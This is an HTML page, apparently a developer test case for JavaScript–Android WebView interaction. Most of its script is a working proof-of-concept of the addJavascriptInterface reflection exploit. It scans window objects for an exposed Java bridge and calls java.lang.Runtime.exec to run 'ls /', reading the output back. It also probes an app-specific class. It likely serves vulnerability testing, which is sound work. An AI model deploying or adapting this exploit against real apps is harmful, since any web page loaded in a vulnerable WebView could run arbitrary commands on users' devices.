<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <title>Js与Android交互案例</title>
    <meta name="viewport"
          content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no"/>
</head>
<body>
<div class="MiniWrap">
    <div class="article-detail">
        <div class="body">
            <div class="title">Js与Android交互案例</div>
            <p><input type="button" value="testJsCallJava" onclick="testJsCallJava();"/></p>
            <p><input type="button" value="testJsCallJava2" onclick="testJsCallJava2();"/></p>
        </div>
    </div>

    <script type="text/javascript">

			function javaCallJs(){
			    alert("javaCallJs success");
			}

			function testJsCallJava(){
			    console.log("++++fdfd1");
			    //testInject();
			    var p = execute(["ls","/"]);
			    console.log("++++"+p);
                console.log("++++"+getContents(p.getInputStream()));
			}

      function getContents(inputStream) {
        var contents = "";
        var b = inputStream.read();
        console.log("++++:"+b);
        while(b != -1) {
            var bString = String.fromCharCode(b);
            contents += bString;
            b = inputStream.read();
        }
        return contents;
       }


       function execute(cmdArgs)
       {
        for (var obj in window) {
            console.log(obj);
            if ("getClass" in window[obj]) {
                console.log("++++f:"+obj);
                return window[obj].getClass().forName("java.lang.Runtime").
                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);//.maxMemory();
             }
         }
       }

       function testInject()
       {
        for (var obj in window) {
            console.log(obj);
            if ("getClass" in window[obj]) {
                console.log("++++f:"+obj);
                var b = window[obj].getClass().forName("com.sw.compat.webview.Util")
                console.log("++++b:"+b);
                    <!--.getMethod("test",null).invoke(null,null);-->
             }
         }
       }


    </script>
</div>
</body>
</html>